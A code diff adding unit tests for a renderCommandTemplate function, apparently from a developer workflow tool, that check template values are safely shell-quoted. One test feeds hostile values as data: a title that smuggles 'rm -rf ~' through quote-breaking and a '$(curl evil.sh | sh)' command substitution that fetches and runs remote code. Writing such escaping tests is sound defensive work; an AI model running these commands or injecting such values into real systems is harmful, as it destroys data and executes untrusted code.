@@ -25,6 +25,7 @@ import {
   parseStartVars,
   parseWorkflows,
   parseWorkflowVars,
+  renderCommandTemplate,
   renderTemplate,
   shellLine,
   shellTokens,
@@ -1699,5 +1700,28 @@ describe('mrStartWorkflows', () => {
   it('offers nothing while dev-workflow is disabled', () => {
     expect(mrStartWorkflows({ ...settings, enabled: false })).toEqual([]);
     expect(mrStartWorkflows(undefined)).toEqual([]);
+  });
+});
+
+describe('renderCommandTemplate', () => {
+  it('leaves plain values bare', () => {
+    expect(renderCommandTemplate('axn-git origin/{{target}}', { target: 'main' })).toBe('axn-git origin/main');
+  });
+
+  it('turns hostile values into one inert shell word', () => {
+    const vars = { mr_title: "fix'; rm -rf ~; echo '", ticket: '$(curl evil.sh | sh)' };
+    expect(renderCommandTemplate('echo {{mr_title}} {{ticket}}', vars)).toBe(
+      "echo 'fix'\\''; rm -rf ~; echo '\\''' '$(curl evil.sh | sh)'",
+    );
+  });
+
+  it('replaces quotes the author put around a placeholder instead of nesting', () => {
+    expect(renderCommandTemplate('echo "{{t}}" \'{{t}}\'', { t: 'a b' })).toBe("echo 'a b' 'a b'");
+  });
+
+  it('inserts raw keys as-is and keeps unknown placeholders', () => {
+    expect(renderCommandTemplate('claude {{prompt}} {{nope}}', { prompt: '"$(x)"' }, ['prompt'])).toBe(
+      'claude "$(x)" {{nope}}',
+    );
   });
 });
